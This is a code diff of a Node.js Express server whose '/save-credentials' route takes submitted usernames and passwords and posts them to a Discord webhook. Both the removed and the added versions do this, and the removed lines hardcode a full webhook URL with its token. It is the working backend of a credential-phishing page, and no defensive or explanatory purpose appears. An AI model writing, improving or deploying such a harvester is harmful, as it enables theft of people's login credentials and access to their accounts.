@@ -1,45 +1,54 @@
 const express = require('express');
-const bodyParser = require('body-parser');
 const fetch = require('node-fetch');
-const path = require('path');
 
 const app = express();
-const port = process.env.PORT || 3000;
 
-app.use(bodyParser.text({ type: 'text/plain' }));
+// Serve static files from the "public" directory
+app.use(express.static('public'));
 
-app.use(express.static(path.join(__dirname, 'public')));
+// Parse form data
+app.use(express.urlencoded({ extended: true }));
 
-const discordWebhookUrl = 'https://discord.com/api/webhooks/1256297119669555352/mMgiWnisGaoKg5mJRa5P_y6kRUb9MdYmXQM8B1iz21s2VqqBcZrVgs9vWHVReECzrIUB';
-
+// Route to handle form submission
 app.post('/save-credentials', async (req, res) => {
-    const credentials = req.body;
-    const payload = { content: `New credentials submitted:\n${credentials}` };
+  const { username, password } = req.body;
 
-    try {
-        const response = await fetch(discordWebhookUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload),
-        });
-
-        if (response.ok) {
-            console.log('Credentials sent to Discord:', credentials);
-            res.status(200).send('Credentials sent successfully.');
-        } else {
-            console.error('Error sending credentials to Discord:', response.statusText);
-            res.status(500).send('Error sending credentials.');
-        }
-    } catch (error) {
-        console.error('Error sending credentials to Discord:', error);
-        res.status(500).send('Error sending credentials.');
-    }
+  try {
+    // Send the credentials to a Discord webhook
+    await sendToDiscordWebhook(username, password);
+    res.status(200).send('Credentials saved successfully!');
+  } catch (error) {
+    console.error('Error saving credentials:', error);
+    res.status(500).send('Error saving credentials');
+  }
 });
 
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
-app.listen(port, () => {
+try {
+  const port = process.env.PORT || 3000;
+  app.listen(port, () => {
     console.log(`Server is running on port ${port}`);
-}); 
+  });
+} catch (error) {
+  console.error('Error starting server:', error);
+  process.exit(1);
+}
+
+async function sendToDiscordWebhook(username, password) {
+  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
+
+  const data = {
+    content: `New Credentials:\nUsername: ${username}\nPassword: ${password}`,
+  };
+
+  const response = await fetch(webhookUrl, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(data),
+  });
+
+  if (!response.ok) {
+    throw new Error(`Failed to send data to Discord webhook: ${response.status}`);
+  }
+}
